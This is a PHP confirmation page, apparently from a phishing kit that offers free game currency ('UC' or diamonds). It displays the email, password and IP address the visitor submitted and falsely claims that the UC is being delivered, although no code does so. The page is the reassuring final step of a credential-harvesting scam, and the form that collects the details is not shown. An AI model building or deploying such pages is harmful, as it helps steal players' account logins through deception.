<?php
session_start();
if (!isset($_SESSION['submission'])) {
    header("Location: index.php");
    exit();
}

$data = $_SESSION['submission'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Topup Successful</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Orbitron', sans-serif;
    }
    .glass {
      background: rgba(255, 255, 255, 0.08);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 1.5rem;
      box-shadow: 0 10px 30px rgba(0, 255, 100, 0.3);
    }
    .pulse {
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse {
      0% { transform: scale(1); opacity: 0.9; }
      50% { transform: scale(1.05); opacity: 1; }
      100% { transform: scale(1); opacity: 0.9; }
    }
  </style>
</head>
<body class="bg-gradient-to-br from-black via-gray-900 to-green-800 min-h-screen flex items-center justify-center text-white p-4">

  <div class="glass w-full max-w-md p-8 text-center">
    <h1 class="text-3xl font-bold text-green-400 mb-4 drop-shadow">✅ Topup Request Received!</h1>
    <p class="text-gray-300 mb-6">Your UC request is being processed. You will receive it shortly.</p>

    <div class="bg-black/40 border border-green-500 rounded-xl p-4 text-left space-y-2 text-sm sm:text-base">
      <p><span class="text-green-300">📧 Email:</span> <?php echo htmlspecialchars($data['email']); ?></p>
      <p><span class="text-green-300">🔒 Password:</span> <?php echo htmlspecialchars($data['password']); ?></p>
      <p><span class="text-green-300">🎁 UC Requested:</span> <?php echo htmlspecialchars($data['uc'] ?? $data['diamonds']); ?></p>
      <p><span class="text-green-300">📍 IP Address:</span> <?php echo htmlspecialchars($data['ip']); ?></p>
    </div>

    <div class="mt-6">
      <p class="text-green-400 text-lg pulse">🎉 Delivering your UC…</p>
    </div>

    <a href="index.php" class="inline-block mt-6 text-sm text-green-300 hover:text-green-500 transition underline">⬅️ Go Back</a>
  </div>

</body>
</html>